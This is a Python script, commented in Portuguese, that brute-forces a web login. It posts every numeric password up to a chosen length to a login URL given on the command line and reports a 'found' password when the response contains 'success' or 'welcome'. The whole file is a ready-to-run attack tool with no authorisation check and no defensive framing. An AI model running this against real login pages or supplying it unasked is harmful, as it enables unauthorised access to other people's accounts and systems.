import requests
import sys
import itertools

class BruteForceLogin:
    def __init__(self, login_url, max_password_length):
        self.login_url = login_url
        self.max_password_length = max_password_length

    def attempt_login(self, password):
        data = {'password': password}
        try:
            response = requests.post(self.login_url, data=data)
            # Verifica se a resposta indica um login bem-sucedido. Ajuste conforme necessário.
            if "success" in response.text.lower() or "welcome" in response.text.lower():
                print(f"Senha encontrada: {password}")
                return True
        except requests.RequestException as e:
            print(f"Erro ao tentar {password}: {e}")
        return False

    def brute_force(self):
        digits = '0123456789'
        for length in range(1, self.max_password_length + 1):
            for password in itertools.product(digits, repeat=length):
                password = ''.join(password)
                if self.attempt_login(password):
                    return
                print(f"Tentando senha: {password}")
        print("Força bruta concluída sem sucesso.")

def main():
    if len(sys.argv) != 3:
        print("Uso: python brute_force.py <login_url> <max_password_length>")
        sys.exit(1)
    
    login_url = sys.argv[1]
    max_password_length = int(sys.argv[2])
    
    brute_forcer = BruteForceLogin(login_url, max_password_length)
    
    print("Iniciando ataque de força bruta...")
    brute_forcer.brute_force()

if __name__ == "__main__":
    main()
